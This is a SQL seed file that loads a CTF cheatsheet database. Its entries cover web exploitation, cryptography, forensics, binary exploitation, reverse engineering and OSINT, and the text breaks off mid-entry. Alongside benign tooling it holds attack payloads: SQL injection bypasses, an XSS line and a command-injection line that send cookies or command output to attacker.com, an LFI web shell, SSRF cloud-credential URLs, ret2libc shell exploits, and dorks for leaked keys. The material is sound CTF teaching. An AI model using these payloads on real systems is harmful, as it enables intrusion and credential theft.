-- iCantFind.it — Cheatsheet Seed Data
-- Run AFTER schema.sql

insert into cheatsheet_entries (title, description, category, snippet, tags, source_url) values

-- ══════════════════════════════════════════════════════════════
-- WEB EXPLOITATION (8)
-- ══════════════════════════════════════════════════════════════

(
  'SQL Injection — Auth Bypass',
  'Classic SQLi payloads to bypass login forms and WHERE clauses.',
  'web',
  $sql$' OR '1'='1' --
' OR 1=1 --
admin'--
' OR ''='
1' OR '1'='1
") OR ("1"="1$sql$,
  ARRAY['sqli','auth-bypass','login'],
  'https://portswigger.net/web-security/sql-injection'
),

(
  'XSS — Basic Probes',
  'Test payloads to confirm XSS is possible before crafting a real exploit.',
  'web',
  $sql$<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<script>fetch('https://attacker.com?c='+document.cookie)</script>
"><script>alert(document.domain)</script>$sql$,
  ARRAY['xss','reflected','stored','client-side'],
  'https://portswigger.net/web-security/cross-site-scripting'
),

(
  'Local File Inclusion (LFI)',
  'Read arbitrary files on the server via a vulnerable file parameter.',
  'web',
  $sql$?file=../../../etc/passwd
?page=....//....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://input  (POST: <?php system($_GET['cmd']); ?>)
?file=/proc/self/environ
?file=/var/log/apache2/access.log  (log poisoning)$sql$,
  ARRAY['lfi','path-traversal','rce'],
  'https://book.hacktricks.xyz/pentesting-web/file-inclusion'
),

(
  'Directory Fuzzing',
  'Enumerate hidden paths and files on a web server.',
  'web',
  $sql$# ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt -fc 404

# gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt -x php,txt
gobuster dir -u https://target.com -w wordlist.txt --status-codes 200,301,302$sql$,
  ARRAY['fuzzing','enumeration','ffuf','gobuster'],
  'https://github.com/ffuf/ffuf'
),

(
  'Command Injection',
  'Inject OS commands into vulnerable input fields.',
  'web',
  $sql$; id
| whoami
`id`
$(id)
& id &
; cat /etc/passwd
; ls -la /
$(curl http://attacker.com/$(id))
# URL encoded: %3B id%0a id$sql$,
  ARRAY['rce','command-injection','os-command'],
  'https://portswigger.net/web-security/os-command-injection'
),

(
  'SSRF — Internal Host Probes',
  'Make the server issue requests to internal/cloud resources.',
  'web',
  $sql$http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
# AWS metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP metadata
http://metadata.google.internal/computeMetadata/v1/$sql$,
  ARRAY['ssrf','internal-network','cloud-metadata'],
  'https://portswigger.net/web-security/ssrf'
),

(
  'JWT — Decode & Attack',
  'Decode a JWT and try common attacks: none algorithm, weak secret.',
  'web',
  $sql$# Decode (no verification needed)
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx" \
  | cut -d. -f2 | base64 -d 2>/dev/null

# Python decode
import base64, json
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

# "none" algorithm attack
header = base64url({"alg":"none","typ":"JWT"})
token = header + "." + payload + "."  # empty signature

# Brute-force secret
hashcat -a 0 -m 16500 token.txt rockyou.txt$sql$,
  ARRAY['jwt','auth','token','none-algorithm'],
  'https://jwt.io'
),

(
  'Burp Suite Quick Reference',
  'Essential Burp Suite shortcuts and workflow for CTF web challenges.',
  'web',
  $sql$# Setup: set browser proxy to 127.0.0.1:8080

# Key shortcuts
Ctrl+R  → Send request to Repeater
Ctrl+I  → Send request to Intruder
Ctrl+U  → URL-encode selection
Ctrl+Z  → URL-decode selection

# Intercept flow
Proxy → Intercept ON → browse → Forward/Drop

# Find hidden params
Target → Site Map → right-click → Engagement Tools → Find comments
Target → right-click → Scan (if Pro)

# Match & Replace
Proxy → Match and Replace → add rule to swap values$sql$,
  ARRAY['burp','proxy','intercept','tools'],
  'https://portswigger.net/burp'
),

-- ══════════════════════════════════════════════════════════════
-- CRYPTOGRAPHY (8)
-- ══════════════════════════════════════════════════════════════

(
  'Base64 / Hex / ROT13 Decode',
  'Quick one-liners for the most common CTF encodings.',
  'crypto',
  $sql$# Base64
echo "SGVsbG8gQ1RG" | base64 -d
python3 -c "import base64; print(base64.b64decode('SGVsbG8gQ1RG').decode())"

# Hex
echo "48656c6c6f" | xxd -r -p
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"

# ROT13
echo "Uryyb PGS" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
python3 -c "import codecs; print(codecs.decode('Uryyb', 'rot_13'))"

# All of these: just use CyberChef → Magic operation$sql$,
  ARRAY['base64','hex','rot13','encoding'],
  'https://gchq.github.io/CyberChef/'
),

(
  'Caesar Cipher Brute Force',
  'Try all 26 shifts when you suspect Caesar / simple shift cipher.',
  'crypto',
  $sql$ciphertext = "KHOOR ZRUOG"

for shift in range(26):
    decrypted = ""
    for c in ciphertext:
        if c.isupper():
            decrypted += chr((ord(c) - shift - 65) % 26 + 65)
        elif c.islower():
            decrypted += chr((ord(c) - shift - 97) % 26 + 97)
        else:
            decrypted += c
    print(f"Shift {shift:2d}: {decrypted}")$sql$,
  ARRAY['caesar','shift-cipher','brute-force'],
  'https://www.dcode.fr/caesar-cipher'
),

(
  'XOR Cipher',
  'Single-byte and multi-byte XOR decryption.',
  'crypto',
  $sql$# Single-byte XOR brute force
ciphertext = bytes.fromhex("1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736")

for key in range(256):
    plain = bytes(c ^ key for c in ciphertext)
    if all(32 <= b < 127 for b in plain):  # printable ASCII
        print(f"Key 0x{key:02x}: {plain.decode()}")

# Multi-byte XOR (known key)
key = b"SECRET"
plain = bytes(c ^ key[i % len(key)] for i, c in enumerate(ciphertext))$sql$,
  ARRAY['xor','single-byte','multi-byte','brute-force'],
  'https://cryptopals.com/sets/1/challenges/3'
),

(
  'Hash Identification & Cracking',
  'Identify hash type then crack with hashcat or online tools.',
  'crypto',
  $sql$# Identify
hashid <hash>
hash-identifier    # interactive

# Hashcat mode reference
# -m 0    → MD5
# -m 100  → SHA1
# -m 1400 → SHA256
# -m 1700 → SHA512
# -m 3200 → bcrypt
# -m 1800 → sha512crypt (Unix)

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Online: crackstation.net, hashes.com$sql$,
  ARRAY['hash','hashcat','md5','sha1','cracking'],
  'https://crackstation.net'
),

(
  'RSA — Small/Weak Primes',
  'Factor small RSA modulus or use factordb for known factorisations.',
  'crypto',
  $sql$from Crypto.PublicKey import RSA
import gmpy2

# Load public key
key = RSA.import_key(open('pub.pem').read())
n, e = key.n, key.e

# If n is small: trial division
p = gmpy2.mpz(2)
while p * p <= n:
    if n % p == 0:
        q = n // p
        break
    p += 1

# Compute private key
phi = (p - 1) * (q - 1)
d = int(gmpy2.invert(e, phi))
# Decrypt: m = pow(c, d, n)
# Online factoring: factordb.com, alpertron.com.ar$sql$,
  ARRAY['rsa','factoring','weak-primes','pycryptodome'],
  'https://www.factordb.com'
),

(
  'Vigenere Cipher Attack',
  'Find the key length (Kasiski/IoC), then brute-force each column.',
  'crypto',
  $sql$# Step 1: find key length with Index of Coincidence
from itertools import cycle

def ic(text):
    text = [c for c in text.upper() if c.isalpha()]
    n = len(text)
    return sum(text.count(c)*(text.count(c)-1) for c in set(text)) / (n*(n-1))

# IC ~0.065 = English; ~0.038 = random
for klen in range(1, 20):
    columns = [''.join(text[i::klen] for i in range(klen))]
    avg_ic = sum(ic(col) for col in columns) / klen
    print(f"Key length {klen}: IC = {avg_ic:.4f}")

# Step 2: decrypt each column with Caesar brute force
# Or use: dcode.fr/vigenere-cipher (auto key-finding)$sql$,
  ARRAY['vigenere','kasiski','index-of-coincidence','classical'],
  'https://www.dcode.fr/vigenere-cipher'
),

(
  'Frequency Analysis',
  'Letter frequency for substitution ciphers — compare to English.',
  'crypto',
  $sql$from collections import Counter

text = "your ciphertext here"
letters = [c.upper() for c in text if c.isalpha()]
freq = Counter(letters)
total = len(letters)

print("Char | Count | Freq")
for char, count in sorted(freq.items(), key=lambda x: -x[1]):
    print(f"  {char}  |  {count:4d} | {count/total*100:.1f}%")

# English frequency order: E T A O I N S H R D L C U M W F G Y P B V K J X Q Z
# Most common bigrams: TH HE IN ER AN RE ON
# Most common trigrams: THE ING AND HER ERE$sql$,
  ARRAY['frequency-analysis','substitution','mono-alphabetic'],
  'https://www.dcode.fr/frequency-analysis'
),

(
  'RSA — Common Attack Cheatsheet',
  'Quick reference for the most frequent RSA CTF attacks.',
  'crypto',
  $sql$# Small e with small plaintext: e-th root attack
import gmpy2
m, exact = gmpy2.iroot(c, e)  # if m^e < n

# Common modulus attack (same n, different e)
# Given: c1=m^e1 mod n, c2=m^e2 mod n, gcd(e1,e2)=1
from math import gcd
from sympy import gcdex
_, a, b = gcdex(e1, e2)
m = (pow(c1, a, n) * pow(c2, b, n)) % n

# Wiener attack (small d): rsatool, owiener library
import owiener
d = owiener.attack(e, n)

# Hastad broadcast (same m, e=3, different n):
# CRT to combine three ciphertexts, then take cube root$sql$,
  ARRAY['rsa','wiener','hastad','common-modulus','cube-root'],
  'https://github.com/RsaCtfTool/RsaCtfTool'
),

-- ══════════════════════════════════════════════════════════════
-- FORENSICS / STEGANOGRAPHY (8)
-- ══════════════════════════════════════════════════════════════

(
  'file + strings — First Steps',
  'Always start here. Identify what a file actually is and grep for the flag.',
  'forensics',
  $sql$file suspicious_file
strings suspicious_file | grep -i "flag\|ctf\|picoctf\|htb{"
strings -n 6 suspicious_file          # min length 6
strings -e l suspicious_file          # little-endian 16-bit (Windows binaries)

# Check magic bytes manually
xxd suspicious_file | head -4
hexdump -C suspicious_file | head -4

# Find printable sequences
cat -v suspicious_file | head -20$sql$,
  ARRAY['file','strings','magic-bytes','initial-analysis'],
  null
),

(
  'exiftool — Metadata Extraction',
  'Pull EXIF metadata from images, PDFs, audio, and other files.',
  'forensics',
  $sql$exiftool image.jpg
exiftool -all image.jpg           # all fields
exiftool -GPS* image.jpg          # GPS only
exiftool -Comment image.jpg       # just comment field
exiftool -b -ThumbnailImage img.jpg > thumb.jpg  # extract thumbnail

# Batch on directory
exiftool *.jpg | grep -i "comment\|gps\|software\|creator"

# Write metadata (useful for challenges asking you to modify):
exiftool -Comment="flag{test}" image.jpg$sql$,
  ARRAY['exiftool','metadata','exif','gps','image'],
  'https://exiftool.org'
),

(
  'binwalk — Extract Embedded Files',
  'Scan for and extract files/data embedded inside other files.',
  'forensics',
  $sql$binwalk file.jpg              # scan only
binwalk -e file.jpg            # extract known types
binwalk -Me file.jpg           # recursive extract
binwalk --dd='.*' file.jpg     # extract EVERYTHING

# After extraction, check _file.jpg.extracted/
ls -la _file.jpg.extracted/

# Entropy analysis (detect encryption/compression)
binwalk -E file.bin

# Alternative: foremost
foremost -i file.jpg -o output_dir/$sql$,
  ARRAY['binwalk','extraction','embedded','foremost'],
  'https://github.com/ReFirmLabs/binwalk'
),

(
  'Wireshark — CTF Filters',
  'Common display filters and workflow for network capture analysis.',
  'forensics',
  $sql$# Display filters
http                              # all HTTP
http.request.method == "POST"     # POST requests only
tcp.stream eq 0                   # first TCP stream
http contains "flag"              # HTTP with "flag" in it
dns                               # DNS queries
ftp-data                          # FTP data transfer
ssl || tls                        # encrypted traffic
frame contains "picoCTF"          # raw frame search

# Follow streams
Right-click packet → Follow → TCP Stream / HTTP Stream

# Export objects (files transferred)
File → Export Objects → HTTP (or SMB, DICOM)

# tshark CLI
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri$sql$,
  ARRAY['wireshark','pcap','network','tshark','filters'],
  'https://www.wireshark.org'
),

(
  'Steghide — Hide/Extract Data',
  'Extract data hidden in JPEG/BMP/WAV files with steghide.',
  'forensics',
  $sql$steghide info image.jpg            # check if data is hidden
steghide extract -sf image.jpg      # extract (prompt for passphrase)
steghide extract -sf image.jpg -p "password"  # with known passphrase
steghide extract -sf image.jpg -p ""  # try empty passphrase

# Brute-force passphrase
stegseek image.jpg /usr/share/wordlists/rockyou.txt

# Embed data (for learning)
steghide embed -cf image.jpg -ef secret.txt -p "passphrase"$sql$,
  ARRAY['steghide','stego','jpeg','bmp','wav','passphrase'],
  'https://steghide.sourceforge.net'
),

(
  'PNG LSB Steganography',
  'Detect and extract data hidden in least significant bits of image pixels.',
  'forensics',
  $sql$# zsteg — best tool for PNG LSB
zsteg -a image.png              # try all methods
zsteg image.png -v              # verbose
zsteg image.png b1,r,lsb,xy    # specific: 1-bit, red channel, LSB

# Python PIL manual extraction
from PIL import Image
img = Image.open("image.png")
pixels = list(img.getdata())
bits = [px[0] & 1 for px in pixels]  # LSB of red channel
chars = [chr(int(''.join(map(str, bits[i:i+8])), 2)) for i in range(0, len(bits), 8)]
print(''.join(chars[:100]))

# stegsolve (Java GUI) — check each bit plane$sql$,
  ARRAY['lsb','steganography','png','zsteg','pixel'],
  'https://github.com/zed-0xff/zsteg'
),

(
  'Audacity — Spectrogram Analysis',
  'Find flags hidden in audio spectrograms — a classic CTF trick.',
  'forensics',
  $sql$# In Audacity:
# 1. Open File → Import → Audio
# 2. Click the track name dropdown → Spectrogram
# 3. View → Zoom In (Ctrl+1) to examine
# 4. Edit → Preferences → Spectrograms → increase max freq for higher res

# CLI with sox + ImageMagick for quick view:
sox audio.wav -n spectrogram -o spec.png
display spec.png

# Python with matplotlib:
import librosa, librosa.display, matplotlib.pyplot as plt
y, sr = librosa.load("audio.wav")
S = librosa.stft(y)
librosa.display.specshow(librosa.amplitude_to_db(abs(S)), sr=sr, x_axis='time', y_axis='hz')
plt.savefig("spec.png", dpi=200)$sql$,
  ARRAY['audacity','spectrogram','audio','wav','stego'],
  null
),

(
  'ZIP / Archive Attacks',
  'Crack password-protected archives or repair corrupted ones.',
  'forensics',
  $sql$# Crack ZIP password
zip2john archive.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# fcrackzip (faster for simple passwords)
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
fcrackzip -u -b -c 'aA1' -l 1-6 archive.zip   # brute-force

# Repair corrupt ZIP
zip -F archive.zip --out fixed.zip
zip -FF archive.zip --out fixed.zip  # more aggressive

# List contents without extracting
unzip -l archive.zip
7z l archive.7z

# RAR cracking
rar2john archive.rar > hash.txt && john hash.txt$sql$,
  ARRAY['zip','archive','password','john','fcrackzip','repair'],
  null
),

-- ══════════════════════════════════════════════════════════════
-- PWN / BINARY EXPLOITATION (8)
-- ══════════════════════════════════════════════════════════════

(
  'checksec — Binary Protections',
  'Check which security mitigations are enabled before exploiting.',
  'pwn',
  $sql$checksec --file=./binary

# What each flag means:
# RELRO  Full    → GOT is read-only (harder to overwrite)
# Stack  Canary  → random value before return addr (detects overflow)
# NX     enabled → stack/heap not executable (no shellcode)
# PIE    enabled → binary loads at random base address (need leak)
# ASLR           → check /proc/sys/kernel/randomize_va_space (0=off)

# Disable ASLR for local testing:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space$sql$,
  ARRAY['checksec','protections','relro','nx','pie','canary','aslr'],
  null
),

(
  'Find Buffer Overflow Offset',
  'Use a cyclic pattern to find the exact offset to the return address.',
  'pwn',
  $sql$from pwn import *

# Generate pattern
pattern = cyclic(200)
print(pattern)

# Run binary, cause crash, then check $rsp (64-bit) or $eip (32-bit)
# In GDB (pwndbg):
#   run < <(python3 -c "from pwn import *; print(cyclic(200))")
#   info registers rsp
#   x/wx $rsp  (or $esp for 32-bit)

# Find the offset
offset = cyclic_find(0x6161616c)   # value from $rsp/$eip
print(f"Offset: {offset}")

# Verify
payload = b"A" * offset + b"B" * 8
# Should overwrite RIP with 0x4242424242424242$sql$,
  ARRAY['buffer-overflow','cyclic','offset','pwntools','gdb'],
  'https://docs.pwntools.com'
),

(
  'ret2win — Basic ROP',
  'Return to a win() function that calls system("/bin/sh") or prints the flag.',
  'pwn',
  $sql$from pwn import *

context.binary = elf = ELF('./binary')
# p = process('./binary')
p = remote('challenge.host', 1337)

offset = 40  # found with cyclic

# Get address of win function
win = elf.symbols['win']   # or: elf.sym['win']
print(f"win @ {hex(win)}")

# 64-bit: may need stack alignment (movaps SSE instruction)
ret = next(elf.search(asm('ret')))
payload = flat({offset: [ret, win]})

# 32-bit: no alignment needed
# payload = flat({offset: win})

p.sendlineafter(b'> ', payload)
p.interactive()$sql$,
  ARRAY['ret2win','rop','buffer-overflow','pwntools','stack-alignment'],
  'https://docs.pwntools.com/en/stable/intro.html'
),

(
  'Format String Exploit',
  'Leak stack values or arbitrary memory using printf-style format strings.',
  'pwn',
  $sql$from pwn import *

# Step 1: find format string offset
# Send: AAAA %1$p %2$p %3$p ...
# Look for 0x41414141 to find your input''s position on the stack

# Leak arbitrary memory (give an address, read with %s)
target_addr = 0x601020  # e.g., GOT entry
payload = p64(target_addr) + b" %6$s"   # 6 = offset to your input

# Leak stack canary (usually around offset 11-15 on x86-64)
payload = b"%11$p"

# Write to arbitrary address (old-school, rare now)
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})$sql$,
  ARRAY['format-string','printf','leak','arbitrary-write','got'],
  'https://axcheron.github.io/exploit-101-format-strings/'
),

(
  'ret2libc — Leak & Return',
  'Bypass NX by leaking libc base address then calling system("/bin/sh").',
  'pwn',
  $sql$from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')   # or: get from server, use libc.rip
rop = ROP(elf)

# Step 1: leak puts@got to find libc base
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
offset  = 40

stage1 = flat({offset: [
    pop_rdi, elf.got['puts'],   # arg = puts@got
    elf.plt['puts'],             # call puts (prints its own address)
    elf.sym['main']              # loop back to main
]})
p.sendlineafter(b'> ', stage1)
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']

# Step 2: call system("/bin/sh")
binsh = next(libc.search(b'/bin/sh'))
stage2 = flat({offset: [ret, pop_rdi, binsh, libc.sym['system']]})
p.sendlineafter(b'> ', stage2)
p.interactive()$sql$,
  ARRAY['ret2libc','got','leak','aslr','pwntools','rop'],
  null
),

(
  'GDB + pwndbg Cheatsheet',
  'Essential GDB commands for CTF binary exploitation.',
  'pwn',
  $sql$# Start
gdb ./binary
gdb -q ./binary    # quiet

# pwndbg commands
run                    # run the program
run < input.txt        # run with input
r < <(python3 exploit.py)  # run with script output
break main             # set breakpoint
break *0x401234        # breakpoint at address
continue / c           # continue
next / n               # step over
step / s               # step into
finish                 # run until function returns
info registers         # show all registers
x/20gx $rsp            # examine 20 qwords from rsp
x/s 0x401234           # examine as string
stack 20               # show stack (pwndbg)
vmmap                  # memory map (pwndbg)
disas main             # disassemble function
cyclic 200             # generate pattern (pwndbg)
cyclic -l 0x6161616c   # find offset (pwndbg)$sql$,
  ARRAY['gdb','pwndbg','debugging','breakpoints','registers'],
  'https://github.com/pwndbg/pwndbg'
),

(
  'ROPgadget — Find Gadgets',
  'Search for ROP gadgets in a binary or libc.',
  'pwn',
  $sql$# List all gadgets
ROPgadget --binary ./binary --rop

# Find specific gadgets
ROPgadget --binary ./binary --rop | grep "pop rdi"
ROPgadget --binary libc.so.6 --rop | grep "pop rdi ; ret"
ROPgadget --binary ./binary --string '/bin/sh'

# ropper alternative
ropper --file ./binary --search "pop rdi"
ropper --file ./binary --chain "execve"

# pwntools ROP
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(hex(pop_rdi))$sql$,
  ARRAY['rop','gadgets','ropgadget','ropper','pwntools'],
  'https://github.com/JonathanSalwan/ROPgadget'
),

(
  'one_gadget — Magic Gadget',
  'Find a single gadget that executes execve("/bin/sh") with right conditions.',
  'pwn',
  $sql$# Find one_gadget in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget libc.so.6

# Output shows constraints (e.g., [rsp+0x50] == NULL)
# Pick a gadget whose constraints are satisfiable at call time

# Use with ret2libc:
one_gadget_offset = 0xe3b01  # from one_gadget output
shell = libc.address + one_gadget_offset
payload = flat({offset: [ret, shell]})  # sometimes needs stack fix

# If constraints aren't met, try 'magic gadget' approach:
# find a ret chain that clears the needed registers first$sql$,
  ARRAY['one_gadget','libc','execve','magic-gadget'],
  'https://github.com/david942j/one_gadget'
),

-- ══════════════════════════════════════════════════════════════
-- REVERSE ENGINEERING (8)
-- ══════════════════════════════════════════════════════════════

(
  'Initial Binary Triage',
  'First commands to run on any unknown binary.',
  're',
  $sql$file binary                          # architecture, strip status, type
strings binary | head -40             # readable strings
strings binary | grep -i "flag\|key\|pass\|secret\|correct"
readelf -h binary                     # ELF header info
readelf -s binary                     # symbol table (if not stripped)
objdump -d binary | head -60          # quick disassembly peek
ldd binary                            # linked libraries
nm binary 2>/dev/null | grep -i "flag\|win\|check"  # symbol names$sql$,
  ARRAY['triage','file','strings','readelf','initial-analysis'],
  null
),

(
  'ltrace + strace — Runtime Tracing',
  'Trace library calls and syscalls to understand what a binary does.',
  're',
  $sql$# Library calls (strcmp, strcpy, malloc, etc.)
ltrace ./binary
ltrace -s 200 ./binary           # increase string length
ltrace ./binary <<< "input"      # pass input via stdin

# System calls (open, read, write, execve, etc.)
strace ./binary
strace -e trace=read,write,open ./binary  # filter specific syscalls
strace -f ./binary               # follow child processes

# Combine both
strace -e trace=all ltrace ./binary 2>&1 | less

# Key things to look for:
# strcmp(your_input, "secret_password") → reveals password
# open("/flag.txt") → it''s reading the flag file
# write(1, ...) → output$sql$,
  ARRAY['ltrace','strace','runtime','syscalls','library-calls'],
  null
),

(
  'Ghidra Quick Start',
  'Load a binary into Ghidra and start reversing.',
  're',
  $sql$# Install: ghidra.re (free, NSA-developed)
# Launch: ./ghidraRun

# Workflow:
# 1. File → New Project → Non-Shared → Next → name it → Finish
# 2. File → Import File → select binary → OK (accept defaults)
# 3. Double-click in project → "Analyze?" → Yes → defaults → Analyze
# 4. Wait for analysis to complete
# 5. Symbol Tree → Functions → double-click "main"
# 6. Decompiler panel shows C-like pseudocode

# Key shortcuts
L          → rename variable/function
;          → add comment
Ctrl+L     → retype variable
Ctrl+G     → go to address
Ctrl+F     → search in listing
Right-click → References → Show references to get call graph$sql$,
  ARRAY['ghidra','decompiler','static-analysis','reverse-engineering'],
  'https://ghidra-sre.org'
),

(
  'Find Key Comparison in Assembly',
  'Identify where the binary checks your input — the most important RE skill.',
  're',
  $sql$; Look for comparison instructions:
cmp     eax, 0x1337      ; compare register with constant
je      success_label    ; jump if equal
jne     fail_label       ; jump if NOT equal
test    eax, eax         ; check if zero
jz / jnz                 ; jump if zero / not zero

; String comparisons:
call    strcmp           ; strcmp(input, correct) → returns 0 if match
call    strncmp          ; strncmp(input, correct, n)
call    memcmp           ; memcmp(buf1, buf2, n)

; In Ghidra: look for iVar = strcmp(input, hardcoded_string)
; The hardcoded_string IS your answer

; Work backwards from the "win" / "correct" / "flag" output:
; Find string in Listing → right-click → References → Show References to Address$sql$,
  ARRAY['assembly','comparison','strcmp','reverse-engineering','x86'],
  null
),

(
  'Python Bytecode Decompile',
  'Recover Python source from .pyc bytecode files.',
  're',
  $sql$# Check Python version of .pyc
python3 -c "import struct; f=open('file.pyc','rb'); f.read(4); print(struct.unpack('<H', f.read(2))[0])"
# Or: python-magic file.pyc

# Decompile (try multiple tools — success varies by Python version)
uncompyle6 bytecode.pyc > source.py      # Python 2/3 up to 3.8
pycdc bytecode.pyc > source.py           # works up to 3.12
decompile3 bytecode.pyc > source.py

# If all fail: disassemble instead
import dis, marshal, py_compile
with open('file.pyc', 'rb') as f:
    f.read(16)  # skip header
    code = marshal.loads(f.read())
dis.dis(code)

# Online: pylingual.io, decompiler.com$sql$,
  ARRAY['python','bytecode','pyc','uncompyle6','decompile'],
  'https://pylingual.io'
),

(
  'Radare2 Basics',
  'Open-source RE framework — good for quick analysis without a GUI.',
  're',
  $sql$r2 ./binary          # open
r2 -A ./binary        # open + auto-analyze (slow, thorough)

# Inside r2:
aaa                   # analyze all (aggressive)
afl                   # list all functions
afl | grep main       # find main
s main                # seek to main
pdf                   # print disassembly of function
VV                    # visual graph mode (q to quit)
V!                    # visual panels mode
iz                    # list strings in data sections
izz                   # list ALL strings
/                     # search: / flag  (find "flag" in memory)
xrefs @sym.main       # cross references
ood                   # reopen in debug mode
dc                    # continue (debug)
db 0x401234           # set breakpoint$sql$,
  ARRAY['radare2','r2','static-analysis','debugging','disassembly'],
  'https://rada.re/n/'
),

(
  'UPX Unpacking',
  'Unpack UPX-compressed executables to expose the real code.',
  're',
  $sql$# Check if packed
file binary              # shows "UPX compressed"
strings binary | grep "UPX"

# Unpack
upx -d packed_binary -o unpacked_binary
upx -d packed_binary     # in-place (overwrites)

# If magic bytes are broken (anti-unpack trick):
# Open in hex editor → fix "UPX!" signature (bytes: 55 50 58 21)
# or fix the compression headers, then retry upx -d

# If upx fails entirely: dynamic unpacking
# Run in x64dbg/edb → set breakpoint at OEP (original entry point)
# OEP is usually right after the decompression loop ends
# Dump process memory at OEP with plugin$sql$,
  ARRAY['upx','packing','unpacking','compression'],
  null
),

(
  '.NET / Java Decompilation',
  'Recover readable source from compiled .NET assemblies and Java .class files.',
  're',
  $sql$# Java
javap -c Main.class               # built-in disassembler
jadx -d output_dir/ app.apk       # APK/JAR decompiler
jadx-gui app.apk                  # GUI version
cfr-decompiler.jar --outputdir out/ app.jar  # alternative

# .NET (C#, F#, VB)
ilspycmd binary.exe -p -o ./src   # ILSpy CLI
dotpeek, dnSpy, ILSpy, AvaloniaILSpy  # GUI tools

# Check for .NET:
file binary             # "PE32 executable... Mono/.Net assembly"
strings binary | grep -i "\.NET\|mscorlib\|System\."

# PowerShell scripts (.ps1): just read them
# Obfuscated PS: IEX / Invoke-Expression → deobfuscate by hand
# or: PowerDecode, psdecode$sql$,
  ARRAY['dotnet','java','jadx','ilspy','decompile','apk'],
  'https://github.com/skylot/jadx'
),

-- ══════════════════════════════════════════════════════════════
-- OSINT (8)
-- ══════════════════════════════════════════════════════════════

(
  'Google Dorks',
  'Advanced Google search operators to find hidden or sensitive information.',
  'osint',
  $sql$site:example.com                         # restrict to domain
site:example.com filetype:pdf              # PDFs on domain
inurl:admin site:example.com              # admin paths
intitle:"index of" site:example.com       # directory listings
intext:"password" site:example.com        # password mentions
site:github.com "example.com" "password"  # leaked creds on GitHub
site:pastebin.com "target_username"       # pastebin leaks
"@example.com" filetype:xls              # email lists
cache:example.com/page                    # cached version

# Useful combinations
site:linkedin.com/in "Company Name" "Job Title"
site:github.com "BEGIN RSA PRIVATE KEY"
"index of" "parent directory" site:example.com$sql$,
  ARRAY['google-dorks','search','enumeration','passive-recon'],
  'https://www.exploit-db.com/google-hacking-database'
),

(
  'Username Enumeration',
  'Find social profiles linked to a username across platforms.',
  'osint',
  $sql$# Sherlock (Python tool)
sherlock username
sherlock username --timeout 10 --print-found
pip install sherlock-project

# whatsmyname.app — web-based, more sites
# namechk.com — availability checker

# Manual checklist:
# GitHub: github.com/username
# Twitter/X: x.com/username
# Reddit: reddit.com/user/username
# LinkedIn: linkedin.com/in/username
# Instagram: instagram.com/username
# HackerNews: news.ycombinator.com/user?id=username
# Pastebin, Keybase, dev.to, medium

# Cross-reference profile bios, linked accounts, profile pictures$sql$,
  ARRAY['username','sherlock','social-media','enumeration'],
  'https://github.com/sherlock-project/sherlock'
),

(
  'Wayback Machine & URL Recon',
  'Find archived versions of pages and historical URLs.',
  'osint',
  $sql$# Web UI: web.archive.org
# Search: web.archive.org/web/*/example.com/*

# CLI tools
waybackurls example.com | tee urls.txt
waybackurls example.com | grep "\.js\|\.php\|admin\|api"

# gau — Get All URLs (combines Wayback, OTX, URLScan)
gau example.com | tee all_urls.txt
gau example.com --blacklist woff,css,png

# Look for:
# - Old admin panels that were removed
# - Backup files: .bak, .old, .backup
# - Config files: .env, .git, .htaccess
# - API keys or secrets in old JS files$sql$,
  ARRAY['wayback','archive','historical','urls','gau'],
  'https://web.archive.org'
),

(
  'Image Reverse Search & EXIF',
  'Trace an image back to its origin and extract location metadata.',
  'osint',
  $sql$# Reverse image search — try all, results vary
# Google Images: images.google.com → camera icon → upload
# TinEye: tineye.com (find original source)
# Yandex: yandex.com/images (best for faces/places)
# Bing Visual: bing.com/visualsearch

# EXIF — may contain GPS coordinates, camera model, timestamps
exiftool image.jpg
exiftool -GPS* image.jpg          # GPS lat/lon
exiftool -a -u image.jpg          # all including unknown tags

# Convert GPS coordinates
# Degrees Minutes Seconds → Decimal Degrees:
# DD = D + M/60 + S/3600
# Paste into maps.google.com or what3words.com$sql$,
  ARRAY['reverse-image','exiftool','gps','metadata','tineye','yandex'],
  null
),

(
  'DNS & Domain Recon',
  'Enumerate subdomains, DNS records, and domain history.',
  'osint',
  $sql$# Basic DNS
whois example.com
nslookup example.com
dig example.com ANY
dig +short example.com MX
dig +short example.com TXT    # may contain SPF, DMARC, flag!

# Subdomain enumeration
subfinder -d example.com -o subs.txt
amass enum -d example.com
# Passive only: subfinder, assetfinder
# Active (sends requests): amass, dnsx

# Certificate Transparency (no scanning needed)
# crt.sh/?q=%.example.com
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u

# DNS brute force
gobuster dns -d example.com -w subdomains-top1000.txt$sql$,
  ARRAY['dns','whois','subdomains','subfinder','amass','crt.sh'],
  'https://crt.sh'
),

(
  'GitHub OSINT',
